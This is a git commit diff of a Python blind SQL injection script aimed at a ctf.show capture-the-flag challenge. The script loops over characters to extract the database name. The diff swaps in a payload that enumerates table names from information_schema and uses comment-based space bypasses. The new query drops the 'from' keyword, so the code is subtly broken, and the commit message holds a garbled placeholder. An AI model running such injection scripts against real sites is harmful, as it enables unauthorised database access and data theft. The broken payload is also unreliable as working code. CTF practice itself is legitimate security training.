4934951935330433e38b5832d3ecb7026e483f27
whb54012 <1226844928@qq.com>
2026-07-21 12:04:32 +0000

    自动提交：更新 ${2026/7/21 20:04ilenPM4e}

--- python/盲注脚本.py
+++ python/盲注脚本.py
@@ -6,7 +6,8 @@ num=0
 url = "https://a71959e2-2471-42b2-893e-220d4132217a.challenge.ctf.show/index.php?id=0/**/or/**/"
 for num1 in range(1,8):
     for num2 in range (47,123):
-        data = "ascii(substr(database()/**/from/**/%d/**/for/**/1))=%d" % (num1, num2)
+        # data = "ascii(substr(database()/**/from/**/%d/**/for/**/1))=%d" % (num1, num2)
+        data = "ascii(substr((select/**/group_concat(table_name)/**/information_schema.tables/**/where/**/table_schema=database())/**/from/**/%d/**/for/**/1))=%d" % (num1, num2)
         result = requests.get(url + data,verify=False)
         if "If" in result.text:
             word+=chr(num2)
